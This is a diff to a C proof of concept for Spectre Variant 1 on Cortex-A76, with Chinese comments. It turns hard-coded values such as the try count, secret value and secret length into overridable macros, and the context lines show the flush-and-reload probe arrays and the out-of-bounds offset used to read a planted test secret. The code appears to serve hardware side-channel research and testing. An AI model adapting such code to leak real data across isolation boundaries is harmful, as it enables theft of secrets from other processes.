@@ -34,8 +34,25 @@ asm volatile(                                      \
     : "memory")
 
 
+#ifndef TRAIN_TIMES
 #define TRAIN_TIMES         15
+#endif
+
+#ifndef ROUNDS
 #define ROUNDS              1
+#endif
+
+#ifndef TRY_COUNT
+#define TRY_COUNT           9999
+#endif
+
+#ifndef SECRET_VALUE
+#define SECRET_VALUE        8
+#endif
+
+#ifndef SECRET_LEN
+#define SECRET_LEN          1
+#endif
 unsigned int array1_size = 16;
 uint8_t unused1[64];
 uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16}; // 16个有效元素，后面填充0
@@ -45,8 +62,8 @@ uint8_t array2[256 * 64] __attribute__((aligned(4096)));;
 
 
 // char *secret = "s";
-// set secret value = int 8
-char ch = 8;
+// set secret value = int SECRET_VALUE
+char ch = SECRET_VALUE;
 char *secret = &ch;
 
 uint8_t temp = 0; /* 用于防止编译器优化掉内存访问 */
@@ -75,7 +92,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
     for (i = 0; i < 256; i++) results[i] = 0;
 
     // 尝试多次以消除噪声
-    for (tries = 9999; tries > 0; tries--) {
+    for (tries = TRY_COUNT; tries > 0; tries--) {
 
         // 1. FLUSH array2 (准备 Reload)
         for (i = 0; i < 256; i++)
@@ -120,7 +137,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
 int main(int argc, const char * * argv) {
     // *secret = 8; // 将 secret 设置为 8 (ASCII '0')，以便我们知道正确答案应该是 8
     printf("Spectre Variant 1 PoC for Cortex-A76\n");
-    printf("Reading %d bytes:\n", (int)strlen(secret));
+    printf("Reading %d bytes:\n", SECRET_LEN);
     printf("The secret value is set to %d\n", *secret);
 
      /* Default addresses to read is 40 (which is the length of the secret string) */
@@ -132,7 +149,7 @@ int main(int argc, const char * * argv) {
     // 假设 secret 存储在 array1 之后的某个位置
     size_t malicious_x = (size_t)(secret - (char *)array1);
     
-    int len = strlen(secret);
+    int len = SECRET_LEN;
     uint8_t value[2];
     int score[2];
 
